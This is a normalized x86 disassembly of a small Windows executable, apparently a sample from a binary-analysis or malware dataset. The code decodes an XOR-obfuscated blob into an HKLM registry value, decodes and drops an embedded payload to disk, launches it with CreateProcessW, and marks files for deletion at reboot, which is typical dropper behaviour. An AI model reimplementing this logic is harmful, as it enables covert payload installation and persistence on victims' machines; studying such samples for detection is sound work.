sub_401000
push ebp
mov ebp esp
sub esp 0x404
push ebx
lea eax [ ebp - 0x4 ]
push eax
push 0xf003f
xor ebx ebx
push ebx
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx 0x8a
lea edi [ ebp - 0x404 ]
[ edi ] [ esi ]
xor esi esi
mov ecx 0x228
call [ GetLastError@IAT ]
xor al al
lea eax [ ebp + esi - 0x404 ]
mov dl [ eax ]
xor dl 0xc4
inc esi
not dl
mov [ eax ] dl
cmp esi ecx
jb r-xdata
push ecx
lea eax [ ebp - 0x404 ]
push eax
push 0x3
push ebx
push r--data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
pop edi
pop esi
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov al bl
jmp r-xdata
pop ebx
leave
retn
sub_401093
push ebp
mov ebp esp
sub esp 0x6e8
push ebx
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] r--data
xor ebx ebx
push r--data
mov [ ebp - 0x10 ] ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
jmp r-xdata
push ebx
call eax
test al al
je r-xdata
jne r-xdata
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] 0x1
push esi
push edi
mov eax rw-data
mov ecx 0x8a
mov esi rw-data
mov edi eax
[ edi ] [ esi ]
xor esi esi
xor edi edi
xor eax eax
jmp r-xdata
mov ecx edi
mov edx 0xc1c2c3c4
shr edx cl
add edi 0x8
xor [ esi + rw-data ] dl
inc esi
cmp edi 0x1140
jb r-xdata
mov [ ebp - 0x8 ] esi
cmp [ rw-data ] bl
jne r-xdata
pop ebx
leave
retn 0x10
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xe8 ]
push eax
mov [ ebp - 0x8 ] 0x80
call [ GetComputerNameA@IAT ]
mov [ ebp - 0x69 ] bl
call [ rand@IAT ]
push eax
lea eax [ ebp - 0xe8 ]
push eax
push r--data
push 0x40
push rw-data
call [ _snprintf@IAT ]
add esp 0x14
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov esi eax
call [ rand@IAT ]
push eax
push r--data
push 0x40
pop eax
sub eax esi
push eax
lea eax [ esi + rw-data ]
push eax
call [ _snprintf@IAT ]
add esp 0x10
push rw-data
mov [ rw-data ] bl
call sub_401000
pop ecx
test al al
jne r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x10 ] ebx
jne r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
mov eax [ rw-data ]
xor esi esi
cmp eax ebx
jbe r-xdata
pop edi
pop esi
movzx ecx [ eax + r--data ]
mov [ ebp + eax - 0x4e8 ] cx
add eax 0x2
cmp cx bx
jne r-xdata
mov esi 0xff
push esi
lea eax [ ebp - 0x2e8 ]
push eax
lea eax [ ebp - 0x4e8 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
push ebx
push 0x80
push 0x2
push ebx
xor eax eax
push ebx
mov [ ebp - 0xec ] ax
push 0x10000000
lea eax [ ebp - 0x2e8 ]
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x4 ] eax
xor edi edi
lea eax [ ebp - 0x2e8 ]
push eax
call [ DeleteFileW@IAT ]
push 0x4
push ebx
lea eax [ ebp - 0x6e8 ]
push eax
call [ MoveFileExW@IAT ]
xor eax eax
inc eax
jmp r-xdata
push ebx
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push edi
call [ WriteFile@IAT ]
push edi
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov ecx edi
shr eax cl
add edi 0x8
xor [ esi + rw-data ] al
mov eax [ rw-data ]
inc esi
cmp esi eax
jb r-xdata
call [ CloseHandle@IAT ]
push esi
lea eax [ ebp - 0x6e8 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x6e8 ]
push eax
lea eax [ ebp - 0x2e8 ]
push eax
push r--data
lea eax [ ebp - 0x4e8 ]
push esi
push eax
call [ _snwprintf@IAT ]
push 0x44
pop esi
push esi
lea eax [ ebp - 0x68 ]
push ebx
push eax
call memset
xor eax eax
lea edi [ ebp - 0x24 ]
stosd [ edi ]
stosd [ edi ]
add esp 0x20
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x4e8 ]
push eax
push ebx
mov [ ebp - 0x68 ] esi
call [ CreateProcessW@IAT ]
mov esi [ MoveFileExW@IAT ]
push 0x4
push ebx
lea eax [ ebp - 0x2e8 ]
push eax
call esi
push 0x4
push ebx
lea eax [ ebp - 0x6e8 ]
push eax
call esi
xor eax eax
call [ CloseHandle@IAT ]
_start
push 0x70
push r--data
call sub_4021f0
xor ebx ebx
push ebx
mov edi [ GetModuleHandleA@IAT ]
call edi
cmp [ eax ] 0x5a4d
jne r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4021ea
cmp [ rw-data ] ebx
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
call sub_4021d8
push r--data
push r--data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ __getmainargs@IAT ]
mov [ ebp - 0x30 ] eax
push r--data
push r--data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x34 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4021ea
call [ __setusermatherr@IAT ]
pop ecx
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x34 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
xor eax eax
cmp [ ecx + 0xe8 ] ebx
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x34 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
xor eax eax
cmp [ ecx + 0xf8 ] ebx
jmp r-xdata
mov [ ebp - 0x4c ] ebx
lea eax [ ebp - 0x78 ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x4c ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x34 ] esi
setne al
mov [ ebp - 0x1c ] eax
push 0xa
pop eax
movzx eax [ ebp - 0x48 ]
jmp r-xdata
call [ _cexit@IAT ]
push esi
call [ exit@IAT ]
push eax
push esi
push ebx
push ebx
call edi
push eax
call sub_401093
mov esi eax
mov [ ebp - 0x7c ] esi
cmp [ ebp - 0x1c ] ebx
jne r-xdata
sub_4021f0
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
retn
memset
jmp [ memset@IAT ]
sub_4021a7
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x80 ]
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call [ _c_exit@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
call sub_402229
retn
push esi
call [ _exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4021d8
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4021ea
xor eax eax
retn
sub_402229
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
_controlfp
jmp [ _controlfp@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
